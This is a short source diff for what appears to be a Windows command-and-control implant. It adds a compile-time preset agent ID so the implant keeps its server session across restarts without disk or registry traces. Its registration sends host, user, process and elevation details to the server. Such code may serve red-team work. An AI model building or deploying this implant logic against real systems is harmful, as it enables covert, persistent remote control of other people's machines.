@@ -3,6 +3,14 @@
 #include "config.h"
 #include "crypto.h"
 #include "b64.h"
+
+// Preset agent ID embedded at build time (-DAGENT_PRESET_ID="<uuid>").
+// Sent as resume_id on first connection so the server restores the pre-registered
+// session across restarts — no disk or registry access required.
+#ifndef AGENT_PRESET_ID
+#define AGENT_PRESET_ID ""
+#endif
+
 #include <winsock2.h>
 #include <ws2tcpip.h>
 #include <windows.h>
@@ -423,10 +431,13 @@ int transport_tcp_register(void) {
     }
 
     // Registration is plaintext — AES key not yet known.
-    // Include resume_id if we already have a UUID (reconnect after server restart).
+    // Determine resume_id: prefer in-memory agent_id (same-process reconnect),
+    // fall back to compile-time AGENT_PRESET_ID (cross-restart persistent identity).
+    const char *resume_id = g_agent.agent_id[0] ? g_agent.agent_id
+                          : (AGENT_PRESET_ID[0]  ? AGENT_PRESET_ID : NULL);
     char body[2048];
     int body_len;
-    if (g_agent.agent_id[0]) {
+    if (resume_id) {
         body_len = snprintf(body, sizeof(body),
             "{\"hostname\":\"%s\",\"username\":\"%s\",\"os\":\"windows/amd64\","
             "\"pid\":%lu,\"transport\":\"tcp\","
@@ -436,7 +447,7 @@ int transport_tcp_register(void) {
             hostname_j, username_json, (unsigned long)GetCurrentProcessId(),
             AGENT_SLEEP_SEC, AGENT_JITTER_PCT, process_json,
             tcp_is_elevated() ? "true" : "false", parent_json,
-            g_agent.agent_id);
+            resume_id);
     } else {
         body_len = snprintf(body, sizeof(body),
             "{\"hostname\":\"%s\",\"username\":\"%s\",\"os\":\"windows/amd64\","
